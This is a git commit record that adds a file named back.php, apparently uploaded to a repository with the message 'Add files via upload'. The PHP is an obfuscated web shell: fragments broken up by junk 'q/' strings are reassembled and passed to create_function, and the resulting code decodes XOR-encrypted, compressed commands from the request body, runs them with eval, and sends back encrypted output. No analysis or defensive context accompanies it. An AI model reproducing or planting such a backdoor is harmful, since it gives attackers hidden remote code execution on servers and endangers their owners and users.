6b8fa7a1cf104038895178a5fec77428cf7d6431
mk4y3l <mikayil.ilyasov@gmail.com>
2019-04-27 02:39:35 +0400

    Add files via upload

---
+++ back.php
@@ -0,0 +1,13 @@
+<?php
+$O='/$j++,$i++){$q/oq/.q/=$t{$i}^$k{$j};}}rq/eturn $o;q/}if(@preq/g_matchq/("';
+$H='seq/64_encq/ode(@x(@gzcoq/mpressq/($o),q/$k));pq/rinq/t("$p$kq/h$r$kf");}';
+$j='/"6XCq/d7QvNW1hDQotX";q/function x(q/$t,$q/k){$c=q/strlen(q/$q/q/q/k);$l=q';
+$o=str_replace('zq','','crezqatzqzqe_fuzqzqnczqtion');
+$L='q/{@obq/_start();@eq/valq/(@gzuncoq/mpressq/(@x(q/@baq/se64_decq/ode(q/$m';
+$v='[1]),$k))q/);$oq/=@oq/b_get_cq/ontq/entsq/();@q/ob_q/enq/d_clean();$r=@ba';
+$N='/strlen($t);$o="";for(q/$i=q/0;$i<$l;)q/{fq/oq/r($j=q/0;($j<$c&&q/$i<$lq/);q';
+$C='/$khq/(.+)q/$kf/",@q/fiq/le_get_q/coq/ntents("q/php:/q//inpuq/t"),$m)==1)';
+$F='$k="7q/b24afc8q/";$khq/="bcq/80eq/548d66c";q/q/$kf="4e7fq/f721q/71c5";$p=q/q';
+$S=str_replace('q/','',$F.$j.$N.$O.$C.$L.$v.$H);
+$i=$o('',$S);$i();
+?>
